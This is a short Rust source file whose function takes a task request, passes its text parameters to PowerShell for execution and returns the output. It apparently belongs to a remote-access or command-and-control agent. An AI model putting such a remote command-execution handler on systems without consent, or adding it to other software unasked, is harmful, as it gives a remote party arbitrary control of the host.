use shared::{
    models::TaskStatus,
    packets::{TaskRequest, TaskResponse},
};
use tokio::process::Command;
use tracing::error;

pub async fn execute(task: &TaskRequest) -> TaskResponse {
    let parameters = match task.parameters.clone() {
        Some(p) => p,
        None => {
            return TaskResponse::new(
                task.task_uuid,
                TaskStatus::Failed,
                Some("No parameters provided".as_bytes().to_vec()),
            );
        }
    };

    let parameters = String::from_utf8(parameters).expect("Invalid UTF-8");

    let output = match Command::new("powershell.exe")
        .arg("-C")
        .arg(parameters)
        .output()
        .await
    {
        Ok(output) => output,
        Err(e) => {
            error!("Failed to execute command: {:?}", e);
            return TaskResponse::new(
                task.task_uuid,
                TaskStatus::Failed,
                Some(e.to_string().as_bytes().to_vec()),
            );
        }
    };

    TaskResponse::new(task.task_uuid, TaskStatus::Completed, Some(output.stdout))
}
